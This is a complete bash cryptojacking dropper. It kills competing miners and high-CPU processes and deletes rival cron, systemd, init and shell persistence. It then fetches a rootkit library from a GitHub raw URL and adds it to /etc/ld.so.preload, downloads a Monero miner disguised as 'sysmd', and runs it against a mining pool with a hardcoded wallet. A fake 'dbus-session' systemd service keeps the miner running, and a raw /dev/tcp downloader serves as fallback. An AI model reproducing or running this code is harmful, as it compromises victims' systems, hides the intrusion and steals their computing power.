#!/bin/bash

if findmnt -n -o OPTIONS /tmp 2>/dev/null | grep -q "noexec"; then
    WORK_DIR="$HOME"
else
    WORK_DIR="/tmp"
fi

OUR_MINER="sysmd"
OUR_MINER_PATH="$WORK_DIR/$OUR_MINER"
MINER_ALREADY_RUNNING=false
if pgrep -f "$OUR_MINER" > /dev/null 2>&1; then
    MINER_ALREADY_RUNNING=true
fi

KNOWN_MINERS=(
    xmrig xmr-stak xmr-stak-cpu xmr-stak-gpu
    SRBMiner srbminer
    cpuminer minerd cgminer bfgminer
    ethminer claymore phoenix_miner phoenixminer
    t-rex trex nbminer gminer lolminer
    teamredminer nanominer wildrig
    ccminer nheqminer dstm zminer ewbf
    cryptonight monero kswapd0 kdevtmpfsi kinsing
    solr.sh config.json ld-linux networkservice
    watchdog dbused sysguard sysupdate
)

for miner in "${KNOWN_MINERS[@]}"; do
    pgrep -f "$miner" > /dev/null 2>&1 && pkill -9 -f "$miner" 2>/dev/null || true
done

if command -v timeout >/dev/null 2>&1; then
    timeout 30s bash -c "
    ps aux --no-headers | awk '\$3 > 80.0 {print \$2, \$11}' | while read pid cmd; do
        if [[ \"\$cmd\" == *\"sysmd\"* ]] || \\
           [[ \"\$cmd\" == *\"Xorg\"* ]] || [[ \"\$cmd\" == *\"gnome\"* ]] || \\
           [[ \"\$cmd\" == *\"firefox\"* ]] || [[ \"\$cmd\" == *\"chrome\"* ]] || \\
           [[ \"\$cmd\" == *\"compil\"* ]] || [[ \"\$cmd\" == *\"make\"* ]] || \\
           [[ \"\$cmd\" == *\"gcc\"* ]] || [[ \"\$cmd\" == *\"apt\"* ]] || \\
           [[ \"\$cmd\" == *\"dpkg\"* ]] || [[ \"\$cmd\" == *\"python\"* ]] || \\
           [[ \"\$cmd\" == *\"node\"* ]] || [[ \"\$cmd\" == *\"java\"* ]]; then
            continue
        fi
        kill -9 \"\$pid\" 2>/dev/null || true
    done
    " 2>/dev/null || true
else
    ps aux --no-headers | awk '\$3 > 80.0 {print \$2, \$11}' | while read pid cmd; do
        if [[ \"\$cmd\" == *\"sysmd\"* ]] || \\
           [[ \"\$cmd\" == *\"Xorg\"* ]] || [[ \"\$cmd\" == *\"gnome\"* ]] || \\
           [[ \"\$cmd\" == *\"firefox\"* ]] || [[ \"\$cmd\" == *\"chrome\"* ]] || \\
           [[ \"\$cmd\" == *\"compil\"* ]] || [[ \"\$cmd\" == *\"make\"* ]] || \\
           [[ \"\$cmd\" == *\"gcc\"* ]] || [[ \"\$cmd\" == *\"apt\"* ]] || \\
           [[ \"\$cmd\" == *\"dpkg\"* ]] || [[ \"\$cmd\" == *\"python\"* ]] || \\
           [[ \"\$cmd\" == *\"node\"* ]] || [[ \"\$cmd\" == *\"java\"* ]]; then
            continue
        fi
        kill -9 \"\$pid\" 2>/dev/null || true
    done
fi

POOL_PATTERNS="stratum|mining|pool\..*:3333|pool\..*:4444|pool\..*:5555|pool\..*:7777|pool\..*:8888|pool\..*:9999|nicehash|nanopool|f2pool|antpool|ethermine|2miners|hashvault|moneroocean|minexmr|herominers"

if command -v ss &>/dev/null; then
    SUSPICIOUS_PIDS=$(ss -tnp 2>/dev/null | grep -iE "$POOL_PATTERNS" | grep -oP 'pid=\K[0-9]+' | sort -u)
elif command -v netstat &>/dev/null; then
    SUSPICIOUS_PIDS=$(netstat -tnp 2>/dev/null | grep -iE "$POOL_PATTERNS" | grep -oP '[0-9]+/' | tr -d '/' | sort -u)
else
    SUSPICIOUS_PIDS=""
fi

for pid in $SUSPICIOUS_PIDS; do
    kill -9 "$pid" 2>/dev/null || true
done

CRON_PATTERNS="xmrig|cryptonight|stratum|kdevtmpfsi|kinsing|minergate|monero|SRBMiner|cpuminer|minerd|watchdog|\.sh.*curl|\.sh.*wget|/tmp/\.|/dev/shm|/var/tmp.*\.sh"

for user_home in /home/* /root; do
    user=$(basename "$user_home")
    [[ "$user" == "*" ]] && continue
    crontab_content=$(crontab -l -u "$user" 2>/dev/null) || continue
    if echo "$crontab_content" | grep -qiE "$CRON_PATTERNS"; then
        echo "$crontab_content" | grep -viE "$CRON_PATTERNS" | crontab -u "$user" - 2>/dev/null
    fi
done

for crondir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
    [[ -d "$crondir" ]] || continue
    find "$crondir" -type f | while read cronfile; do
        grep -qiE "$CRON_PATTERNS" "$cronfile" 2>/dev/null && rm -f "$cronfile"
    done
done

[[ -f /etc/crontab ]] && grep -qiE "$CRON_PATTERNS" /etc/crontab 2>/dev/null && sed -i -E "/$CRON_PATTERNS/Id" /etc/crontab

SYSTEMD_DIRS=("/etc/systemd/system" "/usr/lib/systemd/system" "/lib/systemd/system" "$HOME/.config/systemd/user")

for sdir in "${SYSTEMD_DIRS[@]}"; do
    [[ -d "$sdir" ]] || continue
    find "$sdir" -name "*.service" -o -name "*.timer" 2>/dev/null | while read svc; do
        if grep -qiE "xmrig|miner|stratum|cryptonight|kdevtmpfsi|kinsing|monero|SRBMiner|cpuminer|coinminer" "$svc" 2>/dev/null; then
            svc_name=$(basename "$svc")
            systemctl stop "$svc_name" 2>/dev/null || true
            systemctl disable "$svc_name" 2>/dev/null || true
            rm -f "$svc"
        fi
    done
done
systemctl daemon-reload 2>/dev/null || true

if [[ -d /etc/init.d ]]; then
    find /etc/init.d -type f | while read initscript; do
        if grep -qiE "xmrig|miner|stratum|cryptonight|kdevtmpfsi|kinsing|monero|SRBMiner|cpuminer" "$initscript" 2>/dev/null; then
            "$initscript" stop 2>/dev/null || true
            rm -f "$initscript"
        fi
    done
fi

[[ -f /etc/rc.local ]] && grep -qiE "$CRON_PATTERNS" /etc/rc.local 2>/dev/null && sed -i -E "/$CRON_PATTERNS/Id" /etc/rc.local

SHELL_FILES=(".bashrc" ".bash_profile" ".profile" ".zshrc" ".bash_logout")

for user_home in /home/* /root; do
    [[ -d "$user_home" ]] || continue
    for shell_file in "${SHELL_FILES[@]}"; do
        target="$user_home/$shell_file"
        [[ -f "$target" ]] || continue
        grep -qiE "$CRON_PATTERNS" "$target" 2>/dev/null && sed -i -E "/$CRON_PATTERNS/Id" "$target"
    done
done

MINER_LOCATIONS=(/tmp /var/tmp /dev/shm /run/shm /usr/local/bin /opt)

MINER_FILE_PATTERNS=(
    "xmrig" "xmr-stak" "SRBMiner" "cpuminer" "minerd"
    "kdevtmpfsi" "kinsing" "config.json"
    "cgminer" "bfgminer" "ethminer" "phoenixminer"
    "t-rex" "nbminer" "gminer" "lolminer"
)

for loc in "${MINER_LOCATIONS[@]}"; do
    [[ -d "$loc" ]] || continue
    for pattern in "${MINER_FILE_PATTERNS[@]}"; do
        find "$loc" -maxdepth 3 -iname "*${pattern}*" -type f 2>/dev/null | while read f; do
            if [[ "$f" == *"/config.json" ]] && ! grep -qiE "pool|stratum|mining|wallet|coin" "$f" 2>/dev/null; then
                continue
            fi
            rm -f "$f"
        done
    done
done

find /tmp /var/tmp /dev/shm -maxdepth 2 -name ".*" -executable -type f 2>/dev/null | while read f; do
    file "$f" 2>/dev/null | grep -qiE "ELF|executable|script" && rm -f "$f"
done

for user_home in /home/* /root; do
    auth_keys="$user_home/.ssh/authorized_keys"
    [[ -f "$auth_keys" ]] || continue
    grep -qiE "miner|xmrig|kinsing|bot|pwned" "$auth_keys" 2>/dev/null && sed -i -E "/miner|xmrig|kinsing|bot|pwned/Id" "$auth_keys"
done

if command -v docker &>/dev/null; then
    docker ps -a --format '{{.ID}} {{.Image}} {{.Names}}' 2>/dev/null | grep -iE "miner|xmrig|monero|cryptonight|coinminer" | while read cid rest; do
        docker stop "$cid" 2>/dev/null || true
        docker rm -f "$cid" 2>/dev/null || true
    done
fi

for loc in /tmp /var/tmp /dev/shm; do
    find "$loc" -maxdepth 3 -type f 2>/dev/null | while read f; do
        if lsattr "$f" 2>/dev/null | grep -q "i"; then
            chattr -i "$f" 2>/dev/null
            rm -f "$f"
        fi
    done
done

function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  if ! exec 3<>/dev/tcp/${HOST}/$PORT 2>/dev/null; then
    return 1
  fi

  {
    printf "GET %s HTTP/1.1\r\n" "$DOC"
    printf "Host: %s\r\n" "$HOST"
    printf "User-Agent: Mozilla/5.0\r\n"
    printf "Connection: close\r\n"
    printf "\r\n"
  } >&3

  headers_done=false
  while IFS= read -r line; do
    if [[ "$line" == $'\r' ]] || [[ -z "$line" ]]; then
      headers_done=true
      break
    fi
  done <&3

  if $headers_done; then
    cat <&3
  fi

  exec 3>&-
}

ROOTKIT_URL="https://raw.githubusercontent.com/letscash3-spec/Archnever/main/libsysmd.so"
LIB_NAME="libsysmd.so"
LIB_DEST="/usr/local/lib/$LIB_NAME"
PRELOAD_FILE="/etc/ld.so.preload"

if [ "$(id -u)" -eq 0 ]; then
    if command -v wget &>/dev/null; then
        wget -qO "$LIB_DEST" "$ROOTKIT_URL" --timeout=30 2>/dev/null
    elif command -v curl &>/dev/null; then
        curl -sLo "$LIB_DEST" "$ROOTKIT_URL" --connect-timeout 30 --max-time 60 2>/dev/null
    else
        __curl "http://raw.githubusercontent.com/letscash3-spec/Archnever/main/libsysmd.so" > "$LIB_DEST"
    fi

    chmod 755 "$LIB_DEST"
    chown root:root "$LIB_DEST"

    if [ -f "$PRELOAD_FILE" ] && grep -qF "$LIB_DEST" "$PRELOAD_FILE"; then
        :
    else
        echo "$LIB_DEST" >> "$PRELOAD_FILE"
    fi

    ldconfig
fi

MINER_URL="https://raw.githubusercontent.com/letscash3-spec/Archnever/main/sysmd"

if [ "$MINER_ALREADY_RUNNING" = false ]; then
    if command -v wget &>/dev/null; then
        wget -qO "$OUR_MINER_PATH" "$MINER_URL" --timeout=30 2>/dev/null
    elif command -v curl &>/dev/null; then
        curl -sLo "$OUR_MINER_PATH" "$MINER_URL" --connect-timeout 30 --max-time 120 2>/dev/null
    else
        __curl "http://raw.githubusercontent.com/letscash3-spec/Archnever/main/sysmd" > "$OUR_MINER_PATH"
    fi

    if [ -f "$OUR_MINER_PATH" ] && file "$OUR_MINER_PATH" 2>/dev/null | grep -qi "ELF"; then
        chmod +x "$OUR_MINER_PATH"

        POOL="pool.supportxmr.com:3333"
        ALGO="rx"
        WALLET="49cYWdjskxWWvgEzBrHCF1Dawmu6i1LBebHxgrXa7DXoc53jLPgGZZhWSPNQomn89wD8szkbAMh6dB3zgzBxt8qQGqRFcxq"

        nohup "$OUR_MINER_PATH" -o "$POOL" -a "$ALGO" -u "$WALLET" > /dev/null 2>&1 &
    fi
fi

SYSTEMD_USER_DIR="$HOME/.config/systemd/user"
SERVICE_NAME="dbus-session.service"
SERVICE_FILE="$SYSTEMD_USER_DIR/$SERVICE_NAME"

if command -v systemctl &>/dev/null && [ -f "$OUR_MINER_PATH" ]; then
    mkdir -p "$SYSTEMD_USER_DIR"

    if [ ! -f "$SERVICE_FILE" ]; then
        cat > "$SERVICE_FILE" <<- EOF
[Unit]
Description=D-Bus Session Service
After=network.target

[Service]
ExecStart=$OUR_MINER_PATH -o $POOL -a $ALGO -u $WALLET
Restart=always
RestartSec=60
Nice=10

[Install]
WantedBy=default.target
EOF
    fi

    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable "$SERVICE_NAME" 2>/dev/null || true
    systemctl --user start "$SERVICE_NAME" 2>/dev/null || true
    loginctl enable-linger "$(whoami)" 2>/dev/null || true
fi
